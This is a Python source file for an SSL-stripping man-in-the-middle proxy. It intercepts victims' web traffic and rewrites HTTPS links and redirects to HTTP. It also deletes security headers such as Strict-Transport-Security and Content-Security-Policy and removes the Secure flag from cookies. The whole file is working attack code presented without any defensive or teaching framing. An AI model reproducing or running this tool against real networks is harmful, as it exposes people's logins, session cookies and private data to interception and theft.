import socket
import threading
from http.server import BaseHTTPRequestHandler
from io import BytesIO
import re
import ssl
from urllib.parse import urlparse, urljoin

class SSLStripper:
    def __init__(self, interface, target, gateway, port=8080):
        self.interface = interface
        self.target = target
        self.gateway = gateway
        self.host = '0.0.0.0'
        self.port = port
        self.running = False
        self.server_socket = None
        self.threads = []

    def handle_client(self, client_socket, client_address):
        try:
            request = client_socket.recv(8192)
            if not request:
                client_socket.close()
                return

            # Parse the request
            request_str = request.decode('utf-8', errors='ignore')
            first_line = request_str.split('\n')[0]
            method, path, _ = first_line.split(' ')

            # Extract host from headers
            host_match = re.search(r'Host: (.*?)\r\n', request_str)
            if not host_match:
                client_socket.close()
                return
            
            host = host_match.group(1).strip()
            
            # Handle HTTPS URLs and redirects
            if path.startswith('https://'):
                path = path.replace('https://', 'http://', 1)
                print(f"[+] Stripped HTTPS from request path: {path}")

            # Create connection to remote server
            remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                remote_socket.connect((host, 80))
            except:
                print(f"[!] Failed to connect to {host}")
                client_socket.close()
                return

            # Modify request headers
            modified_request = self.strip_request_security(request_str, host, path)
            remote_socket.sendall(modified_request.encode())

            # Get and modify response
            response = self.receive_response(remote_socket)
            modified_response = self.strip_response_security(response, host)
            
            client_socket.sendall(modified_response)

        except Exception as e:
            print(f"[!] Error handling client {client_address}: {e}")
        finally:
            if 'remote_socket' in locals():
                remote_socket.close()
            client_socket.close()

    def strip_request_security(self, request_str, host, path):
        """Strip security-related headers from request"""
        # Remove security-related headers
        headers_to_remove = [
            'Upgrade-Insecure-Requests',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection'
        ]
        
        for header in headers_to_remove:
            request_str = re.sub(f'{header}:.*?\r\n', '', request_str, flags=re.IGNORECASE)

        # Replace any remaining HTTPS URLs with HTTP
        request_str = request_str.replace('https://', 'http://')
        
        # Ensure host header is correct
        request_str = re.sub(r'Host:.*?\r\n', f'Host: {host}\r\n', request_str, flags=re.IGNORECASE)
        
        return request_str

    def strip_response_security(self, response, host):
        """Strip HTTPS and security features from response"""
        try:
            response_str = response.decode('utf-8', errors='ignore')
            modified = False

            # Handle different types of redirects
            redirect_codes = ['301', '302', '303', '307', '308']
            first_line = response_str.split('\n')[0]
            
            if any(code in first_line for code in redirect_codes):
                # Find and modify Location header
                location_match = re.search(r'Location: (.*?)\r\n', response_str, re.IGNORECASE)
                if location_match:
                    original_location = location_match.group(1)
                    new_location = original_location.replace('https://', 'http://')
                    response_str = response_str.replace(original_location, new_location)
                    print(f"[+] Modified redirect from {original_location} to {new_location}")
                    modified = True

            # Remove security headers
            security_headers = [
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Public-Key-Pins',
                'Expect-CT'
            ]
            
            for header in security_headers:
                response_str = re.sub(f'{header}:.*?\r\n', '', response_str, flags=re.IGNORECASE)

            # Replace HTTPS with HTTP in content
            if 'text/html' in response_str or 'application/javascript' in response_str or 'text/css' in response_str:
                # Replace in href and src attributes
                response_str = re.sub(r'(href=["\'])(https://)', r'\1http://', response_str, flags=re.IGNORECASE)
                response_str = re.sub(r'(src=["\'])(https://)', r'\1http://', response_str, flags=re.IGNORECASE)
                response_str = re.sub(r'(url\(["\']?)(https://)', r'\1http://', response_str, flags=re.IGNORECASE)
                
                # Replace in JavaScript
                response_str = re.sub(r'(["\'](https://[^\'"]+)["\'])', 
                                    lambda m: m.group().replace('https://', 'http://', 1),
                                    response_str)

                modified = True

            # Remove secure flags from cookies
            response_str = re.sub(r';\s*secure', '', response_str, flags=re.IGNORECASE)
            
            if modified:
                print(f"[+] Modified response for {host}")
            
            return response_str.encode()
        except Exception as e:
            print(f"[!] Error modifying response: {e}")
            return response

    def receive_response(self, sock):
        """Receive full response from socket"""
        response = b""
        sock.settimeout(2)
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
        except socket.timeout:
            pass
        sock.settimeout(None)
        return response

    def start(self):
        """Start the SSL stripping proxy"""
        self.running = True
        print(f"[+] Starting SSL strip proxy on {self.host}:{self.port}")
        
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(100)

        try:
            while self.running:
                client_socket, client_address = self.server_socket.accept()
                print(f"[+] Connection from {client_address}")
                thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
        except Exception as e:
            print(f"[!] Error in SSL stripper: {e}")
        finally:
            self.stop()

    def stop(self):
        """Stop the SSL stripping proxy"""
        print("\n[*] Stopping SSL stripper...")
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=1.0)
        self.threads.clear()
        print("[+] SSL stripper stopped")
